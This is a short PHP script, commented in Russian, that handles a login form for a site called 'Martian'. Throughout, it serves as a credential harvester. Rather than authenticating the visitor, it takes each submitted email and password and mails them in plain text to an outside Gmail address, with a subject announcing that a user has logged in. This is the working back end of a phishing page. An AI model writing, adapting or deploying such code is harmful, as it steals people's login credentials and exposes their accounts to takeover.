    <?php
        //проверяем, существуют ли переменные в массиве POST
        if(!isset($_POST['email']) and !isset($_POST['password']))
        {
        
        } 
        else 
        {
            //показываем форму
            $email = $_POST['email'];  //Создаём две переменный, так как два инпута
            $password = $_POST['password'];
            
            $email = htmlspecialchars($email); //преобразуем все символы, которые пользователь попытается добавить в форму:
            $password = htmlspecialchars($password);

            $email= urldecode($email); //декодируем url, если пользователь попытается его добавить в форму.
            $password = urldecode($password);

            $email = trim($email); //удаляем пробелы с начала и конца строки, если таковые имеются:
            $password = trim($password);

            //echo $email; //Проверяли что выводилось
            //echo "<br>";
            //echo $password;

                if (mail("lower013634@gmail.com", "Внимание! Пользователь совершил вход на сайт Martian.", "Email пользователя: ". $email . "." . "\r\n" . "Пароль: ". $password . "." ,"From: mail.temp.test12@gmail.com"))
                {
                    echo 'Сообщение успешно отправлено!';
                }
                else {
                    echo 'При отправке данного сообщения возникли ошибки.';
                }
              }  
                ini_set('display_errors','On');
                error_reporting('E_ALL');
?>
